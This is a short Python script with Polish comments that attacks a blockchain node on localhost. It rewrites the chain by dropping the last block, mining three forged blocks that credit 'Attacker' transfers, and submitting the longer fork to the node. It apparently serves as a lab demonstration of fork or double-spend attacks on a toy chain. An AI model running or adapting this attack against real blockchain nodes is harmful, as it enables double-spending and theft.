import json
import hashlib
import time
import requests

# Adres istniejącego węzła
node_address = "http://127.0.0.1:5000"

# Wczytujemy aktualny blockchain
response = requests.get(f"{node_address}/chain")
if response.status_code != 200:
    print("❌ Nie udało się pobrać łańcucha bloków.")
    exit()

chain = response.json()["chain"]

# Tworzymy alternatywny łańcuch (fork)
print("🔗 Tworzenie alternatywnego łańcucha...")
fork_chain = chain[:-1]  # Usuwamy ostatni blok, aby stworzyć fork
last_block = fork_chain[-1]

# Dodajemy nowe bloki do forka
for i in range(3):  # Dodajemy 3 nowe bloki
    transactions = [{"sender": "Attacker", "receiver": "Bob", "amount": 50}]
    block = {
        "index": last_block["index"] + 1,
        "timestamp": time.time(),
        "transactions": transactions,
        "nonce": 0,
        "previous_hash": last_block["hash"]
    }

    # Szukanie nonce i hash spełniającego difficulty
    while True:
        block_string = json.dumps(block, sort_keys=True).encode()
        block_hash = hashlib.sha256(block_string).hexdigest()
        if block_hash.startswith("0" * 2):  # Zakładamy trudność 2
            block["hash"] = block_hash
            break
        else:
            block["nonce"] += 1

    fork_chain.append(block)
    last_block = block
    print(f"✅ Dodano blok #{block['index']} z hashem: {block['hash']}")

# Wysyłamy alternatywny łańcuch do sieci
print("📡 Rozpowszechnianie alternatywnego łańcucha...")
forged_chain_data = {"length": len(fork_chain), "chain": fork_chain}
response = requests.post(f"{node_address}/new_block", json=forged_chain_data)

if response.status_code == 201:
    print("✅ Alternatywny łańcuch zaakceptowany przez sieć.")
else:
    print("❌ Sieć odrzuciła alternatywny łańcuch.")
